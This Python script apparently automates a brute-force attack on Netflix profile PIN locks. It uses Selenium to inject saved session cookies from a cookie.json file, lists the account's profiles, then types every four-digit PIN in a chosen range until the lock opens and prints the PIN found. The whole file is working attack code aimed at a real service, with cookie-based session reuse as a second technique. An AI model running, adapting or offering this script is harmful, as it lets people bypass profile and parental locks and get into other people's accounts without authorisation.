import pickle
import requests
import json
from selenium import webdriver
try:
    with open('cookie.json',"r") as f:
        data = json.load(f)
    json_string = json.dumps(data)
    pickle.dump( data , open("cookies.pkl","wb"))
except:
    print("cookie.json not found, only use this when you are using cookies")


# print(json_string)

browser = webdriver.Chrome('chromedriver.exe')

browser.get('https://www.netflix.com/login')
# print(browser.get_cookies())

print("login or use cookies")
cookie_use=input("press y to use cookies: ")
if(cookie_use=='y'):
    browser.delete_all_cookies()
    cookies = pickle.load(open("cookies.pkl", "rb"))
    for cookie in cookies:
        if 'sameSite' in cookie:
            del cookie['sameSite']
        browser.add_cookie(cookie)

# print(browser.get_cookies())
profile_names=[]
browser.get('https://www.netflix.com/browse')
profiles=browser.find_elements_by_class_name('profile-name')
# print(profiles)
for profile in profiles:
    profile_names.append(profile.get_attribute("innerHTML"))
i=0
print("*"*10)

for profile in profile_names:
    print(i,end=" ")
    print(profile)
    i+=1

profile_input=int(input("Select profile number to brute force: \n"))


# print(profile_names)
isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
# print(isPresent)
profiles[profile_input].click()
inputs=browser.find_elements_by_class_name('pin-number-input')
testuserst=int(input("Select start number 0 to 9998: "))
testusered=int(input("Select end number 1 to 9999: "))

brutetest=testuserst

print("Bruteforce starts now:")
print("The last few numbers will be the PIN")
while(not isPresent):
    z=str(brutetest).zfill(4)
    inputs[0].send_keys(z[0])
    inputs[1].send_keys(z[1])
    inputs[2].send_keys(z[2])
    inputs[3].send_keys(z[3])
    isPresent = len(browser.find_elements_by_class_name('account-dropdown-button')) > 0
    brutetest+=1
    print(z[0],end="")
    print(z[1],end="")
    print(z[2],end="")
    print(z[3])
    isPresent2 = len(browser.find_elements_by_class_name('pin-number-input')) > 0
    if(not isPresent2):
        brutetest-=1
        break


    if(brutetest>testusered):
        break
    # print(z)
print('PIN is:')
print(brutetest)


    



# pickle.dump( browser.get_cookies() , open("cookiestest.json","wb"))